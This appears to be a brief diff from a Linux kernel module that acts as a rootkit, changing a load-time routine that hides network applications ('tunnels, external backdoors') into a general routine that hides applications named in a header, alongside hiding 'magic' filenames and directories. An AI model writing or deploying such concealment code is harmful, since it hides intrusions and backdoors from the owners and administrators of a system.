@@ -736,12 +736,11 @@ cont:
     /** hide magic filenames & directories */
     fs_add_name_ro(names);
 
-    /** Hide network applications that match
-     * the names defined in netapp.h
-     * tunnels, external backdoors...
-     * Run once
+    /** Hide applications onload that match
+     * the names defined in lkm.h
+     * It runs only once
      */
-    kv_scan_and_hide_netapp();
+    kv_scan_and_hide();
 
 #ifndef DEBUG_RING_BUFFER
     /** *pr_info because it must be shown even if DEPLOY=1 */
